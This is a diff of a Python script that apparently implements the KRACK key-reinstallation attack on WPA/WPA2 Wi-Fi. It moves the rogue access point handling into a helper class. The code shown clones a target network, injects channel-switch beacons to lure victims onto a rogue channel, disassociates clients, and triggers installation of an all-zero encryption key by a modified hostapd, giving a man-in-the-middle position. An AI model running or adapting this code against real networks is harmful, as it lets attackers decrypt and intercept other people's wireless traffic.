@@ -9,19 +9,12 @@
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
-import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, textwrap
+import time, argparse, heapq, subprocess, atexit, select, textwrap
 from datetime import datetime
-from wpaspy import Ctrl
 from packet_processing import *
 from log_messages import *
 from mitm_code import *
 
-
-IEEE_TLV_TYPE_SSID    = 0
-IEEE_TLV_TYPE_CHANNEL = 3
-IEEE_TLV_TYPE_RSN     = 48
-IEEE_TLV_TYPE_CSA     = 37
-IEEE_TLV_TYPE_VENDOR  = 221
 
 class ClientState():
 	'''
@@ -223,9 +216,6 @@ class KRAckAttack():
 		self.nic_rogue_ap = nic_rogue_ap
 		self.ssid = ssid
 		self.mitmconfig = None
-		self.hostapd = None
-		self.hostapd_log = None
-		
 
 		# This is set in case of targeted attacks
 		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
@@ -245,33 +235,12 @@ class KRAckAttack():
 
 		self.mitmconfig = MitmChannelBased(nic_real, self.nic_rogue_ap, nic_rogue_mon, self.ssid, args.group, self.clientmac, dumpfile)
 
-	def hostapd_rx_mgmt(self, p):
-		'''
-		Description: manage packets sent to hostapd instance
-
-		Arguments:
-		  p: 802.11 packet
-		'''
-		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
-		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))
-
-	def hostapd_add_sta(self, macaddr):
-		'''
-		Description: forward authentication packet to Rogue AP sent by the client
-
-		Arguments:
-		  macaddr: the MAC address of the client to register
-		'''
-		log(DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
-		self.hostapd_rx_mgmt(Dot11(addr1=self.mitmconfig.apmac, addr2=macaddr, addr3=self.mitmconfig.apmac)/Dot11Auth(seqnum=1))
-
 	def hostapd_finish_4way(self, stamac):
 		'''
 		Description: send FINISH_4WAY signal to hostapd (Rogue AP)
 		'''
 		log(DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
 		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
-
 
 	def send_disas(self, macaddr):
 		'''
@@ -301,10 +270,10 @@ class KRAckAttack():
 			return False
 
 		# 1. Add the client to hostapd
-		self.hostapd_add_sta(client.macaddr)
+		self.mitmconfig.hostapd_add_sta(client.macaddr)
 
 		# 2. Inform hostapd of the encryption algorithm and options the client uses
-		self.hostapd_rx_mgmt(client.assocreq)
+		self.mitmconfig.hostapd_rx_mgmt(client.assocreq)
 
 		# 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
 		self.hostapd_finish_4way(client.macaddr)
@@ -405,7 +374,6 @@ class KRAckAttack():
 		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
 		if Dot11WEP in p and p.addr1 == self.mitmconfig.apmac and p.addr3 == self.mitmconfig.apmac and dot11_get_tid(p) == 7:
 			log(STATUS, "Got a likely group message 2", showtime=False)
-
 
 	def handle_rx_realchan(self):
 		'''
@@ -510,7 +478,6 @@ class KRAckAttack():
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
 			print_rx(INFO, "Real channel ", p)
 
-
 	def handle_rx_roguechan(self):
 		p = self.mitmconfig.sock_rogue.recv()
 		if p == None: return
@@ -574,40 +541,17 @@ class KRAckAttack():
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
 			print_rx(INFO, "Rogue channel", p)
 
-	def handle_hostapd_out(self):
-		# hostapd always prints lines so this should not block
-		line = self.hostapd.stdout.readline()
-		if line == "":
-			log(ERROR, "Rogue hostapd instances unexpectedly closed")
-			quit(1)
-
-		if line.startswith(">>>> "):
-			log(STATUS, "Rogue hostapd: " + line[5:].strip())
-		elif line.startswith(">>> "):
-			log(DEBUG, "Rogue hostapd: " + line[4:].strip())
-		# This is a bit hacky but very usefull for quick debugging
-		elif "fc=0xc0" in line:
-			log(WARNING, "Rogue hostapd: " + line.strip())
-		elif "sta_remove" in line or "Add STA" in line or "disassoc cb" in line or "disassocation: STA" in line:
-			log(DEBUG, "Rogue hostapd: " + line.strip())
-		else:
-			log(ALL, "Rogue hostapd: " + line.strip())
-
-		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line)
+	
 
 	def run(self, strict_echo_test=False):
 		
 		self.mitmconfig.configure_interfaces()
-
-		# Make sure to use a recent backports driver package so we can indeed
-		# capture and inject packets in monitor mode.
 		self.mitmconfig.create_sockets(strict_echo_test)
 
 		# Test monitor mode and get MAC address of the network
 		self.mitmconfig.find_beacon(self.ssid)
 		
 		# Parse beacon and used this to generate a cloned hostapd.conf
-		
 		self.mitmconfig.from_beacon(self.mitmconfig.beacon)
 		if not self.mitmconfig.is_wparsn():
 			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
@@ -635,16 +579,7 @@ class KRAckAttack():
 		self.mitmconfig.sock_rogue.attach_filter(bpf)
 
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
-		with open("hostapd_rogue.conf", "w") as fp:
-			fp.write(self.mitmconfig.write_config(self.nic_rogue_ap))
-		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-		self.hostapd_log = open("hostapd_rogue.log", "w")
-
-		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
-		time.sleep(1)
-
-		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
-		self.hostapd_ctrl.attach()
+		self.mitmconfig.init_hostapd()
 
 		# Inject some CSA beacons to push victims to our channel
 		self.mitmconfig.send_csa_beacon(numbeacons=4, newchannel=self.mitmconfig.rogue_channel)
@@ -662,10 +597,10 @@ class KRAckAttack():
 		self.last_rogue_beacon = time.time()
 		nextbeacon = time.time() + 0.01
 		while True:
-			sel = select.select([self.mitmconfig.sock_rogue, self.mitmconfig.sock_real, self.hostapd.stdout], [], [], 0.1)
+			sel = select.select([self.mitmconfig.sock_rogue, self.mitmconfig.sock_real, self.mitmconfig.hostapd.stdout], [], [], 0.1)
 			if self.mitmconfig.sock_real      in sel[0]: self.handle_rx_realchan()
 			if self.mitmconfig.sock_rogue     in sel[0]: self.handle_rx_roguechan()
-			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
+			if self.mitmconfig.hostapd.stdout in sel[0]: self.mitmconfig.handle_hostapd_out()
 
 			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
 				p = self.group1.pop(0)
@@ -690,11 +625,11 @@ class KRAckAttack():
 
 	def stop(self):
 		log(STATUS, "Closing hostapd and cleaning up ...")
-		if self.hostapd:
-			self.hostapd.terminate()
-			self.hostapd.wait()
-		if self.hostapd_log:
-			self.hostapd_log.close()
+		if self.mitmconfig.hostapd:
+			self.mitmconfig.hostapd.terminate()
+			self.mitmconfig.hostapd.wait()
+		if self.mitmconfig.hostapd_log:
+			self.mitmconfig.hostapd_log.close()
 		if self.mitmconfig.sock_real: self.mitmconfig.sock_real.close()
 		if self.mitmconfig.sock_rogue: self.mitmconfig.sock_rogue.close()
 
